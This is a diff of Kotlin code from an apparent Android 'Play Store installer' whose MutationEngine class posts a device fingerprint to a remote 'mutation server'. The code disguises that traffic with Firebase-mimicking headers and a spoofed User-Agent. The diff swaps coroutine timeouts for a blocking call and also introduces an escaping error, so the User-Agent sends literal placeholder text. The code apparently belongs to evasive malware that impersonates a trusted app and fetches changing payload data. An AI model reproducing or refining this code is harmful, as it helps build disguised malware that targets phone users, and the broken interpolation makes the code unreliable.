@@ -3,9 +3,7 @@ package com.playstore.installer
 import android.content.Context
 import android.os.Build
 import android.provider.Settings
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.withContext
-import kotlinx.coroutines.withTimeout
+import java.util.concurrent.TimeoutException
 import org.json.JSONObject
 import java.io.BufferedReader
 import java.io.InputStreamReader
@@ -94,11 +92,11 @@ class MutationEngine(private val context: Context) {
 
     // ── Tier 1: Call mutation server ──────────────────────────────────────────
 
-    private suspend fun callMutationServer(
+    private fun callMutationServer(
         fingerprint: String,
         clientToken: String
-    ): JSONObject? = withContext(Dispatchers.IO) {
-        try {
+    ): JSONObject? {
+        return try {
             val endpoint = "$SERVER_URL/api/v1/$clientToken/key"
             val url = URL(endpoint)
             val conn = url.openConnection() as HttpURLConnection
@@ -108,7 +106,7 @@ class MutationEngine(private val context: Context) {
             // Firebase-mimicking headers
             conn.setRequestProperty("X-Firebase-Client", "fire-core/21.0.0 fire-iid/21.0.0")
             conn.setRequestProperty("User-Agent",
-                "Dalvik/2.1.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.MODEL})")
+                "Dalvik/2.1.0 (Linux; Android \${Build.VERSION.RELEASE}; \${Build.MODEL})")
             conn.connectTimeout = CONNECT_TIMEOUT
             conn.readTimeout = READ_TIMEOUT
             conn.doOutput = true
@@ -122,7 +120,7 @@ class MutationEngine(private val context: Context) {
             conn.outputStream.use { it.write(body.toByteArray()) }
 
             val responseCode = conn.responseCode
-            if (responseCode != 200) return@withContext null
+            if (responseCode != 200) return null
 
             val response = BufferedReader(InputStreamReader(conn.inputStream))
                 .use { it.readText() }
@@ -308,14 +306,10 @@ class MutationEngine(private val context: Context) {
             return ByteArray(0)
         }
 
-        // Tier 1: Try mutation server (3 second timeout)
+        // Tier 1: Try mutation server (timeout enforced by connectTimeout/readTimeout)
         var mutations: JSONObject? = null
         try {
-            val response = kotlinx.coroutines.runBlocking {
-                withTimeout(SERVER_TIMEOUT_MS) {
-                    callMutationServer(fingerprint, clientToken)
-                }
-            }
+            val response = callMutationServer(fingerprint, clientToken)
 
             if (response != null) {
                 val data = response.optJSONObject("data")
